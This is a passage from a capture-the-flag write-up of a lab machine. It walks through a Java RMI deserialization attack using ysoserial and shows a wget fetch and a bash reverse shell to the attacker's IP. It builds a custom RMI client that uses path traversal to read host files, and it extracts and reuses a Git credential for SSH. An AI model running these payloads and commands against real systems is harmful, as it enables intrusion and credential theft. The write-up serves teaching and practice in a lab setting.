[+] Creating ysoserial payload... failed.
[-] Caught unexpected java.lang.reflect.InvocationTargetException during gadget generation.
[-] You probably specified a wrong gadget name or an invalid gadget argument.
[-] Cannot continue from here.    

```

I’ll clone `remote-method-guesser` to my system, and as in the install instructions, go into that directory. Before running `mvn package`, I’ll edit `src/config.properties`, setting `yso = /opt/ysoserial/ysoserial-all.jar`. Now `mvn package` creates `target/rmg-5.0.0-jar-with-dependencies.jar`, which I’ll move up a directory and name `rmg.jar`.

#### RCE

At this point, I need to give `rmg.jar` a payload and a command. Both of these are a bit tricky. I know the `commons-collections-3.1.jar` is on the server from the `lib` directory. That means the payloads `CommonsCollections1`, `CommonsCollections3`, `CommonsCollections5`, `CommonsCollections6`, and `CommonsCollections7` could work.

It also seems likely that I’ll be dropping into a container (for such a complex web setup on an insane box), so I will have to try a few different Linux commands to see if it works (`ping`, `curl`, `wget`). With some trial and error, I find that `CommonsCollections5` plus `wget` works.

I’ll start `rmg`:

```

oxdf@hacky$ java -jar ./rmg.jar listen 10.10.14.6 9002 CommonsCollections5 'wget 10.10.14.6/rce'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 10.10.14.6:9002.
[+] Handing off to ysoserial...

```

There’s a relatively quick cleanup on the `rmi.host` variable, so I’ll keep that POST request in Repeater so I can quickly send it to reset it back to my host. After sending, I’ll refresh `/hosting/panel`:

```

oxdf@hacky$ java -jar ./rmg.jar listen 10.10.14.6 9002 CommonsCollections5 'wget 10.10.14.6/rce'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 10.10.14.6:9002.
[+] Handing off to ysoserial...
Have connection from /10.10.11.223:44232
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection

```

Just after, there’s a hist on my Python webserver:

```
10.10.11.223 - - [29/Jan/2024 09:16:28] code 404, message File not found
10.10.11.223 - - [29/Jan/2024 09:16:28] "GET /rce HTTP/1.1" 404 -

```

#### Shell

Java is very picky about characters that break up commands like `|` and `&` and `;`. To be safe, I’ll just get a shell in two steps. First, I’ll create a simple `shell.sh` containing a [simple bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll have the server fetch this:

```

oxdf@hacky$ java -jar ./rmg.jar listen 10.10.14.6 9002 CommonsCollections5 'wget 10.10.14.6/shell.sh'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 10.10.14.6:9002.
[+] Handing off to ysoserial...
Have connection from /10.10.11.223:52008
Reading message...
Sending return with payload for obj [0:0:0, 0]

```

RegistryTwo requests the script from my server:

```
10.10.11.223 - - [29/Jan/2024 09:17:52] "GET /shell.sh HTTP/1.1" 200 -

```

`wget` should save it in the current directory. I’ll stop `rmg` and rerun with a command to run it:

```

oxdf@hacky$ java -jar ./rmg.jar listen 10.10.14.6 9002 CommonsCollections5 'bash shell.sh'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 10.10.14.6:9002.
[+] Handing off to ysoserial...
Have connection from /10.10.11.223:33230
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection

```

This time there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.223 47188
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4$ 

```

It’s not worth a full Beyond Root section, but `curl` didn’t work because it’s not in this container:

```

bash-4.4$ curl
bash: curl: command not found

```

`ping` is [busybox](https://busybox.net/downloads/BusyBox.html), which isn’t SetUID, so it fails:

```

bash-4.4$ ping 10.10.14.6
PING 10.10.14.6 (10.10.14.6): 56 data bytes
ping: permission denied (are you root?)
bash-4.4$ ls -l /bin/ping
lrwxrwxrwx    1 root     root            12 Jan  9  2018 /bin/ping -> /bin/busybox
bash-4.4$ ls -l /bin/busybox
-rwxr-xr-x    1 root     root        805024 Dec 12  2017 /bin/busybox

```

### RCE via MySQL JDBC

The intended way to get execution on the box is very similar to the attack I showed above, but rather than exploiting RMI, messing with the JDBC connection string and perform a deserialization attack similar to what’s shown [here](https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-mysql-jdbc-deserialization-rce.html). It is very similar, though slightly more complex to pull off. It does use the same building blocks, changing `mysql.host` rather than `rmi.host`, and without the need for the null byte.

## Shell as developer

### Enumeration

#### Container

The shell is in a container. There’s a `.dockerenv` file in the system root, which is always a good sign:

```

bash-4.4$ ls -la /.dockerenv
-rwxr-xr-x    1 root     root             0 Jul  4  2023 /.dockerenv

```

The container has a `docker0` interface but also is sharing the IP of the main host:

```

bash-4.4$ ifconfig
br-59a3a780b7b3 Link encap:Ethernet  HWaddr 02:42:75:A5:14:1F
          inet addr:172.19.0.1  Bcast:172.19.255.255  Mask:255.255.0.0
          inet6 addr: fe80::42:75ff:fea5:141f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:399519 errors:0 dropped:0 overruns:0 frame:0
          TX packets:351989 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1212049149 (1.1 GiB)  TX bytes:27562840 (26.2 MiB)

docker0   Link encap:Ethernet  HWaddr 02:42:95:D0:18:38
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:A1:E9
          inet addr:10.10.11.223  Bcast:10.10.11.255  Mask:255.255.254.0
          inet6 addr: dead:beef::250:56ff:feb9:a1e9/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:a1e9/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1464323 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1654034 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:216693743 (206.6 MiB)  TX bytes:1715473938 (1.5 GiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:5564363 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5564363 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:723677305 (690.1 MiB)  TX bytes:723677305 (690.1 MiB)

veth6283b47 Link encap:Ethernet  HWaddr EE:0A:E8:AD:8F:93
          inet6 addr: fe80::ec0a:e8ff:fead:8f93/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:368307 errors:0 dropped:0 overruns:0 frame:0
          TX packets:320511 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1209629999 (1.1 GiB)  TX bytes:21909415 (20.8 MiB)

veth9ec563c Link encap:Ethernet  HWaddr 76:B5:59:8D:6A:4B
          inet6 addr: fe80::74b5:59ff:fe8d:6a4b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:31212 errors:0 dropped:0 overruns:0 frame:0
          TX packets:31717 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:8012416 (7.6 MiB)  TX bytes:5670395 (5.4 MiB)

```

That’s not something seen often before on HTB, this comes from `docker` using the [host network driver](https://docs.docker.com/network/drivers/host/):

> If you use the `host` network mode for a container, that container’s network stack isn’t isolated from the Docker host (the container shares the host’s networking namespace), and the container doesn’t get its own IP-address allocated. For instance, if you run a container which binds to port 80 and you use `host` networking, the container’s application is available on port 80 on the host’s IP address.

app’s home directory is very bare:

```

bash-4.4$ ls -la ~
total 16
drwxr-sr-x    1 app      app           4096 Jul  5  2023 .
drwxr-xr-x    1 root     root          4096 Jul  5  2023 ..
-rw-------    1 app      app            216 Jan 29 21:14 .bash_history

```

The only visible process is the Tomcat server. There’s nothing interesting in the Tomcat directories.

#### Network

The WAR file makes a connection to `registry.webhosting.htb:9002` for JMI. That host is defined as this one in the `/etc/hosts` file:

```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1       registry.webhosting.htb

```

Looking at the listening ports, it is listening on 9002:

```

bash-4.4$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5001            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3310            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
tcp        0      0 :::443                  :::*                    LISTEN      -
tcp        0      0 :::45919                :::*                    LISTEN      -
tcp        0      0 ::ffff:127.0.0.1:8005   :::*                    LISTEN      1/java
tcp        0      0 :::5000                 :::*                    LISTEN      -
tcp        0      0 :::8009                 :::*                    LISTEN      1/java
tcp        0      0 :::5001                 :::*                    LISTEN      -
tcp        0      0 :::9002                 :::*                    LISTEN      -
tcp        0      0 :::3306                 :::*                    LISTEN      -
tcp        0      0 :::3310                 :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      1/java

```

It kind of looks like it’s only open on IPv6 (which I’ll come back to in [Beyond Root](#unintended-paths) for an unintended shortcut), but it is open on IPv4 as well:

```

bash-4.4$ nc -zv 127.0.0.1 9002
127.0.0.1 (127.0.0.1:9002) open

```

It’s not immediately clear because of how Docker is networking, but the RMI service is on the host.

### hosting-app RMI Usage

#### com.htb.hosting.rmi

I already abused the RMI connection with a deserialization attack to get execution in the container. I was able to do that just by seeing that RMI was in use, without actually looking at how it is used. The `FileService` object (defined in `com.htb.hosting.rmi.FileService.class`) is an `interface`, which is like an abstract class in Java. It defines methods, what arguments they take, and the type of the return value, without actually giving any of the code the does that. This allows the code here to create a `FileService` object and call the methods without having the actual code.

```

package WEB-INF.classes.com.htb.hosting.rmi;

import com.htb.hosting.rmi.AbstractFile;
import java.io.IOException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface FileService extends Remote {
  List<AbstractFile> list(String paramString1, String paramString2) throws RemoteException;
  
  boolean uploadFile(String paramString1, String paramString2, byte[] paramArrayOfbyte) throws IOException;
  
  boolean delete(String paramString) throws RemoteException;
  
  boolean createDirectory(String paramString1, String paramString2) throws RemoteException;
  
  byte[] view(String paramString1, String paramString2) throws IOException;
  
  AbstractFile getFile(String paramString1, String paramString2) throws RemoteException;
  
  AbstractFile getFile(String paramString) throws RemoteException;
  
  void deleteDomain(String paramString) throws RemoteException;
  
  boolean newDomain(String paramString) throws RemoteException;
  
  byte[] view(String paramString) throws RemoteException;
}

```

There is some remote file store and this is how to interact with it. This class uses the `AbstractFile` object, which is just a class that holds metadata about a file such as the display name, if it’s a directory, the size, the permissions, etc. The `list` method returns an array of these objects.

The `RMIClientWrapper` object has a single method, `get`, that initializes and returns a `FileService` object:

```

public class RMIClientWrapper {
  private static final Logger log = Logger.getLogger(com.htb.hosting.rmi.RMIClientWrapper.class.getSimpleName());
  
  public static FileService get() {
    try {
      String rmiHost = (String)Settings.get(String.class, "rmi.host", null);
      if (!rmiHost.contains(".htb"))
        rmiHost = "registry.webhosting.htb"; 
      System.setProperty("java.rmi.server.hostname", rmiHost);
      System.setProperty("com.sun.management.jmxremote.rmi.port", "9002");
      log.info(String.format("Connecting to %s:%d", new Object[] { rmiHost, Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999)) }));
      Registry registry = LocateRegistry.getRegistry(rmiHost, ((Integer)Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999))).intValue());
      return (FileService)registry.lookup("FileService");
    } catch (Exception e) {
      e.printStackTrace();
      throw new RuntimeException(e);
    } 
  }
}

```

This is the code where I had to use the null byte to have it both contact my IP *and* end in ““.htb”.

#### FileService Usage

`com.htb.hosting.services.DomainServlet` is a primary user of the `FileService` object. This servlet is responsible for creating domains, and adding, editing, and deleting files on them. For example, when it creates a new domain, it does that via the `FileService` (which for some reason it seems to get a new one each time with `RMIClientWrapper.get()`), and then uploads the default `index.html` to that vhost:

![image-20240130111405497](/img/image-20240130111405497.png)

Most of the function used seem to take a VHost name along with additional parameters as make sense for that task.

To imaging what is likely happening, when a VHost is created, it gets a directory that serves as the root for the webserver.

### Malicious RMI Client

I’ll create my own client to read and list files on the RMI host.

#### IDE Setup

Java can be finicky about how it gets compiled. I’ll download and follow the install instructions for the [IntelliJ IDEA Community Edition](https://www.jetbrains.com/idea/download/). I’ll create a new project and give is a location and name:

![image-20240130112832113](/img/image-20240130112832113.png)

It starts an empty project:

![image-20240130112910587](/img/image-20240130112910587.png)

#### Add Dependencies

For this to work, I’m going to use some of the code from `hosting-app.war`. The directory structures matter in Java, so I’ll mirror what’s in the WAR. I’ll right click on `src` and select New -> Package, and name it `com.htb.hosting.rmi`. On it, I’ll add a New File, and name it `AbstractFile.java`. I’ll copy all the code from `jd-gui` for that file and paste it into here. The only change I need to make is the package at the top is no longer `WEB-INF.classes.com.htb.hosting.rmi`, but rather just `com.htb.hosting.rmi`. I’ll do the same for `FileService.class`.

I’ll do the same thing with `RMIClientWrapper.java`, but this one needs a bit more editing. It is loading the `com.htb.hosting.utils.config.Settings` class to get things like the name of the server to connect to. I’ll remove that import and modify the code to just connect to `registry.webhosting.htb`:

```

package com.htb.hosting.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.logging.Logger;

public class RMIClientWrapper {
    private static final Logger log = Logger.getLogger(com.htb.hosting.rmi.RMIClientWrapper.class.getSimpleName());

    public static FileService get() {
        try {
            String rmiHost = "registry.webhosting.htb";
            Registry registry = LocateRegistry.getRegistry(rmiHost, 9002);
            return (FileService)registry.lookup("FileService");
        } catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }
}

```

#### Client

I’ll add a `Main` Java class at the root of `src`:

![image-20240130113913984](/img/image-20240130113913984.png)

With a bit of playing around, I’ll build a Java program that will read files and list directories. I’m going to show just my final project, but it took many iterations of adding something, running it, looking at the results, updating to get to here. Getting direct access to the RMI port, either using the IPv6 unintended I cover in [Beyond Root](#unintended-paths) or tunneling with [Chisel](https://github.com/jpillora/chisel), makes this go must faster, but I’ll show the intended path here for completeness.

My `Main` class ends up as:

```

import com.htb.hosting.rmi.AbstractFile;
import com.htb.hosting.rmi.FileService;
import com.htb.hosting.rmi.RMIClientWrapper;

import java.util.List;

public class Main {

    public static void usage() {
        System.out.println("Usage: exploit [vhost] [cmd] [path]\n  cmd is ls or cat");
        System.exit(0);
    }

    public static void main(String[] args) {
        FileService fileService = RMIClientWrapper.get();
        if (args.length != 3) {
            usage();
        }
        try {
            if (args[1].equals("cat")) {
                byte[] result = fileService.view(args[0], "../../" + args[2]);
                System.out.println(new String(result));
            } else if (args[1].equals("ls")) {
                List<AbstractFile> files = fileService.list(args[0], "../../" + args[2]);
                for (AbstractFile file : files) {
                    System.out.println(file.getDisplayName());
                }
            } else {
                System.out.println("Unknown command: " + args[1]);
                usage();
            }
        } catch (Exception ex) {
            System.out.println("Something went wrong");
            usage();
        }
    }
}

```

It takes in a vhost id, cmd of “ls” or “cat”, and file path as arguments.

#### Fix Java Version

If I build this with a modern version of Java, when I try to run it on the container on RegistryTwo, it will fail:

```

bash-4.4$ java -jar EvilRMI.jar c0a4a2cfd9ce ls .
Error: A JNI error has occurred, please check your installation and try again  
Exception in thread "main" java.lang.UnsupportedClassVersionError: Main has been compiled by a more recent version of the Java Runtime (class file version 61.0), this version of the Java Runtime only recognizes 
class file versions up to 52.0                   
        at java.lang.ClassLoader.defineClass1(Native Method)
        at java.lang.ClassLoader.defineClass(ClassLoader.java:763)           
        at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
        at java.net.URLClassLoader.defineClass(URLClassLoader.java:467)
        at java.net.URLClassLoader.access$100(URLClassLoader.java:73)
        at java.net.URLClassLoader$1.run(URLClassLoader.java:368) 
        at java.net.URLClassLoader$1.run(URLClassLoader.java:362)                 
        at java.security.AccessController.doPrivileged(Native Method)  
        at java.net.URLClassLoader.findClass(URLClassLoader.java:361)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:424) 
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:335)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:357)     
        at sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:495)

```

There’s a table on [this Stack Overflow answer](https://stackoverflow.com/a/69426065) that shows what version of Java maps to what major version. I need to go back to Java 8. I’ll run `sudo apt install openjdk-8-jdk`, and then in File -> Project Structure, on the Project tab, select that JDK (Java 8 shows as 1.8 for [some reason](https://www.oracle.com/java/technologies/javase/jdk8-naming.html)):

![image-20240130115927610](/img/image-20240130115927610.png)

#### Build

To run this, I’ll have IDEA build a JAR file. First, I’ll need to add an artifact output under File -> Project Structure, then under the Artifacts menu click the “+” -> JAR -> From module with dependencies…:

![image-20240130114554132](/img/image-20240130114554132.png)

I’ll select `Main` as my Main Class and click OK to get out.

Now under Build > Build Artifacts I’ll select EvilRMI:jar -> Rebuild and it generates `EvilRMI.jar`:

![image-20240130114753924](/img/image-20240130114753924.png)

#### Run

I’ll upload `EVilRMI.jar` to the container on RegistryTwo:

```

bash-4.4$ wget 10.10.14.6/EvilRMI.jar
Connecting to 10.10.14.6 (10.10.14.6:80)
EvilRMI.jar          100% |*******************************|  4741   0:00:00 ETA

```

I’ll run it giving it one of the domains from the list on the website, and the `ls` command with `.` to list the current directory:

```

bash-4.4$ java -jar EvilRMI.jar c0a4a2cfd9ce ls .
..
initrd.img
opt
sbin
snap
root
var
proc
mnt
vmlinuz
vmlinuz.old
boot
tmp
initrd.img.old
cdrom
home
lib64
quarantine
run
dev
sys
etc
media
usr
srv
lib
sites
lost+found
bin

```

When I first build the client, this was in the `/sites/[vhost]` directory and showed `index.html`. As I played with the development, it was easier to add in the `../../` to the code so that it based out of `/`.

### Shell

#### Enumeration

With this ability to list directories and read files, I’ll look at the filesystem. There’s a single home directory:

```

bash-4.4$ java -jar EvilRMI.jar c0a4a2cfd9ce ls /home
..
developer

```

Whatever user this is running as can read in it:

```

bash-4.4$ java -jar EvilRMI.jar c0a4a2cfd9ce ls /home/developer 
..
.cache
.bash_logout
.bashrc
.bash_history
.git-credentials
user.txt
.gnupg
.profile
.vimrc

```

`.git-credentials` is interestring:

```

bash-4.4$ java -jar EvilRMI.jar c0a4a2cfd9ce cat /home/developer/.git-credentials
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com

```

#### SSH

Those creds work for the developer user over SSH:

```

oxdf@hacky$ sshpass -p qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9 ssh developer@webhosting.htb
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
...[snip]...
developer@registry:~$

```

And get `user.txt`:

```

developer@registry:~$ cat user.txt
25044958************************

```

## Shell as root

### Enumeration

#### File System

This appears to be the host system. The developer user’s home directory doesn’t have anything else of interest:

```

developer@registry:~$ ls -la
total 40
drwxr-xr-x 4 developer developer 4096 Jul  5  2023 .
drwxr-xr-x 3 root      root      4096 Jul  5  2023 ..
lrwxrwxrwx 1 developer developer    9 Mar 27  2023 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Mar 26  2023 .bash_logout
-rw-r--r-- 1 developer developer 3771 Mar 26  2023 .bashrc
drwx------ 2 developer developer 4096 Jul  5  2023 .cache
-rw-r--r-- 1 developer developer   60 Mar 26  2023 .git-credentials
drwx------ 3 developer developer 4096 Jul  5  2023 .gnupg
-rw-r--r-- 1 developer developer  807 Mar 26  2023 .profile
-rw-r----- 1 root      developer   33 Jan 26 20:49 user.txt
-rw-r--r-- 1 developer developer   39 Jun 16  2023 .vimrc

```

The various websites are in `/sites`:

```

developer@registry:/sites$ ls
www.static-482f6175cb85.webhosting.htb  www.static-68d01707c93f.webhosting.htb  www.static-e492442a4be9.webhosting.htb
www.static-5403e43655a0.webhosting.htb  www.static-950ba61ab119.webhosting.htb  www.static-e511acc71eed.webhosting.htb
www.static-5762637d572b.webhosting.htb  www.static-c0a4a2cfd9ce.webhosting.htb  www.static-f7200b8c1225.webhosting.htb
www.static-5a9d1f63c28c.webhosting.htb  www.static-dd1305ddf270.webhosting.htb  www.webhosting.htb

```

I’ll dig a bit more into how the website is configured in [Beyond Root](#nginx-setup), but it’s not important for escalating to root.

The only thing really interesting on this file system is in `/opt`:

```

developer@registry:/opt$ ls
containerd  registry.jar

```

#### Processes

[pspy](https://github.com/DominicBreuker/pspy) shows there are few different crons running on this host.
- `/root/tomcat-app/reset.sh`, which uses sleeps in a loop to effectively reset the Tomcat settings every 10 seconds.
- `/usr/local/sbin/vhosts-manage -m quarantine` - every minute
- `systemctl restart registry.service` - every three minutes

### Quarantine

#### vhosts-manage

`vhost-manage` is an ELF binary:

```

developer@registry:~$ file /usr/local/sbin/vhosts-manage
/usr/local/sbin/vhosts-manage: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ca6e5eb6a2863662d6c620d59fed33db34da2b4, with debug_info, not stripped

```

`vhost-manage` runs a JAR file. It doesn’t run for very long, so PSpy often misses it, but it does catch it occasionally:

```

2024/01/30 19:48:01 CMD: UID=0     PID=18869  | /usr/local/sbin/vhosts-manage -m quarantine 
2024/01/30 19:48:01 CMD: UID=0     PID=18871  | /usr/bin/java -jar /usr/share/vhost-manage/includes/quarantine.jar  

```

If I run PSpy with `-f` for file system events, it catches it all the time:

```

2024/01/30 20:15:01 CMD: UID=0     PID=21075  | /usr/local/sbin/vhosts-manage -m quarantine 
2024/01/30 20:15:01 FS:                 OPEN | /usr/lib/jvm/java-17-openjdk-amd64/bin/java
2024/01/30 20:15:01 FS:               ACCESS | /usr/lib/jvm/java-17-openjdk-amd64/bin/java
2024/01/30 20:15:01 FS:                 OPEN | /usr/lib/jvm/java-17-openjdk-amd64/lib/libjli.so
2024/01/30 20:15:01 FS:               ACCESS | /usr/lib/jvm/java-17-openjdk-amd64/lib/libjli.so
2024/01/30 20:15:01 FS:                 OPEN | /usr/share/vhost-manage/includes/quarantine.jar
2024/01/30 20:15:01 FS:               ACCESS | /usr/share/vhost-manage/includes/quarantine.jar
2024/01/30 20:15:01 FS:               ACCESS | /usr/share/vhost-manage/includes/quarantine.jar
2024/01/30 20:15:01 FS:               ACCESS | /usr/share/vhost-manage/includes/quarantine.jar
2024/01/30 20:15:01 FS:        CLOSE_NOWRITE | /usr/share/vhost-manage/includes/quarantine.jar

```

The `includes` directory is a string in `vhost-manage`, and if I had to guess, I’d suggest `-m` is giving it a module to load.

#### quarantine.jar

`quarantine.jar` is the only file in `/usr/share/vhost-manage/includes`:

```

developer@registry:~$ ls /usr/share/vhost-manage/includes/
quarantine.jar

```

I’ll bring a copy back to my VM, and (after verifying the hashes match) open it in `jd-gui`. It’s files are all in `com.htb.hosting.rmi`, and it seems to have to do with ClamAV:

![image-20240130152943235](/img/image-20240130152943235.png)

The `main` function gets a `Client` and calls `scan()`:

```

package com.htb.hosting.rmi;

public class Main {
  public static void main(String[] args) {
    try {
      (new Client()).scan();
    } catch (Throwable e) {
      Client.out(1024, "an unknown error occurred", new Object[0]);
      e.printStackTrace();
    } 
  }
}

```

The `Client` constructor function connects to the same local RMI instance on 9002 and gets a configuration, using that to create a `ClamScan` instance:

```

  public Client() throws RemoteException, NotBoundException {
    Registry registry = LocateRegistry.getRegistry("localhost", 9002);
    QuarantineService server = (QuarantineService)registry.lookup("QuarantineService");
    this.config = server.getConfiguration();
    this.clamScan = new ClamScan(this.config);
  }

```

`scan` is simple as well. It gets the directory from the config, gets the files from the directory, and then loops over them calling `doScan`:

```

  public void scan() {
    File[] documentRoots = this.config.getMonitorDirectory().listFiles();
    if (documentRoots == null || documentRoots.length == 0) {
      out(256, "exiting", new Object[0]);
      return;
    } 
    out("initialize scan for %d domains", new Object[] { Integer.valueOf(documentRoots.length) });
    for (File documentRoot : documentRoots)
      doScan(documentRoot); 
  }

```

`doScan` checks if it’s been passed a directory, and if so, loops over the contents passing them to itself. If not, then it runs `clamScan.scanPath` on it, and if it returns `FAILED`, passes the file to `quarantine`:

```

  private void doScan(File file) {
    if (file.isDirectory()) {
      File[] files = file.listFiles();
      if (files != null)
        for (File f : files)
          doScan(f);  
    } else {
      try {
        Path path = file.toPath();
        try {
          if (Files.isSymbolicLink(path)) {
            out(16, "skipping %s", new Object[] { file.getAbsolutePath() });
            return;
          } 
        } catch (Exception e) {
          out(16, "unknown error occurred when processing %s\n", new Object[] { file });
          return;
        } 
        ScanResult scanResult = this.clamScan.scanPath(path.toAbsolutePath().toString());
        switch (scanResult.getStatus()) {
          case ERROR:
            out(768, "there was an error when checking %s", new Object[] { file.getAbsolutePath() });
            break;
          case FAILED:
            out(32, "%s was identified as a potential risk. applying quarantine ...", new Object[] { file
                  .getAbsolutePath() });
            quarantine(file);
            break;
          case PASSED:
            out(0, "%s status ok", new Object[] { file.getAbsolutePath() });
            break;
        } 
      } catch (IOException e) {
        out(512, "io error processing %s", new Object[] { file.getAbsolutePath() });
      } 
    } 
  }

```

`quarantine` simply copies the file to a folder specified in the config.

The `ClamScan` class constructor loads the configuration:

```

  public ClamScan(QuarantineConfiguration quarantineConfiguration) {
    setHost(quarantineConfiguration.getClamHost());
    setPort(quarantineConfiguration.getClamPort());
    setTimeout(quarantineConfiguration.getClamTimeout());
  }

```

The `scanPath` method connects to the host and post over a socket sending data about the file, and then gets a response and turns it into a `ScanResult` object.

```

  public ScanResult scanPath(String path) throws IOException {
    Socket socket = new Socket();
    try {
      socket.connect(new InetSocketAddress(getHost(), getPort()));
    } catch (IOException e) {
      Client.out(768, "could not connect to clamd server", new Object[0]);
      return new ScanResult(e);
    } 
    try {
      socket.setSoTimeout(getTimeout());
    } catch (SocketException e) {
      Client.out(768, "could not set socket timeout to " + getTimeout() + "ms", new Object[0]);
    } 
    DataOutputStream dos = null;
    String response = "";
    try {
      int read;
      try {
        dos = new DataOutputStream(socket.getOutputStream());
      } catch (IOException e) {
        Client.out(768, "could not open socket OutputStream", new Object[0]);
        return new ScanResult(e);
      } 
      try {
        byte[] b = String.format("zSCAN %s\000", new Object[] { path }).getBytes();
        dos.write(b);
      } catch (IOException e) {
        Client.out(768, "error writing SCAN command", new Object[0]);
        return new ScanResult(e);
      } 
      byte[] buffer = new byte[2048];
      try {
        read = socket.getInputStream().read(buffer);
      } catch (IOException e) {
        Client.out(768, "error reading result from socket", new Object[0]);
        read = 0;
      } 
      if (read > 0)
        response = new String(buffer, 0, read); 
    } finally {
      if (dos != null)
        try {
          dos.close();
        } catch (IOException e) {
          Client.out(768, "exception closing DOS", new Object[0]);
        }  
      try {
        socket.close();
      } catch (IOException e) {
        Client.out(768, "exception closing socket", new Object[0]);
      } 
    } 
    return new ScanResult(response.trim());
  }

```

The response string is used to create a `ScanResult` object that is returned.

### Registry

#### Service

`/etc/systemd/system/registry.service` defines the `registry` service:

```

[Unit]
Description=rmi registry service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=rmi-service
ExecStart=/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar

[Install]
WantedBy=multi-user.target

```

It’s running `registry.jar` noted above. It’s running as the rmi-service user. It’s not clear if that user is a target or not.

#### JAR General

The `registry.jar` file is the RMI server. It is based from a `com.htb.hosting.rmi` package:

![image-20240130171114810](/img/image-20240130171114810.png)

`Server` has the `main` function, creating a RMI registry listening on 9002 and giving it two services, `FileService` and `QuarantineSevice`:

```

public class Server {
  public static void main(String[] args) throws Exception {
    int port = 9002;
    System.setProperty("java.rmi.server.hostname", "registry.webhosting.htb");
    Registry registry = LocateRegistry.createRegistry(9002);
    System.out.printf("[+] Bound to %d\n", new Object[] { Integer.valueOf(9002) });
    FileService fileService = new FileServiceImpl();
    FileService fileServiceStub = (FileService)UnicastRemoteObject.exportObject(fileService, 0);
    registry.bind("FileService", fileServiceStub);
    QuarantineServiceImpl quarantineServiceImpl = new QuarantineServiceImpl();
    QuarantineService quarantineServiceStub = (QuarantineService)UnicastRemoteObject.exportObject((Remote)quarantineServiceImpl, 0);
    registry.bind("QuarantineService", (Remote)quarantineServiceStub);
  }
}

```

The `FileService` is something I’ve already explored. It’s got the same interface in `FileService.class`, but that class is implemented in `FileServiceImpl.class`.

#### Quarantine

The more interesting bit is the Quarantine bits. The `QuarantineSevice` and `QuarantineServiceImpl` classes offer only one method besides the constructor:

```

public class QuarantineServiceImpl implements QuarantineService {
  private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
  
  private static final QuarantineConfiguration DEFAULT_CONFIG = new QuarantineConfiguration(new File("/root/quarantine"), FileServiceConstants.SITES_DIRECTORY, "localhost", 3310, 1000);
  
  public QuarantineConfiguration getConfiguration() throws RemoteException {
    logger.info("client fetching configuration");
    return DEFAULT_CONFIG;
  }
}

```

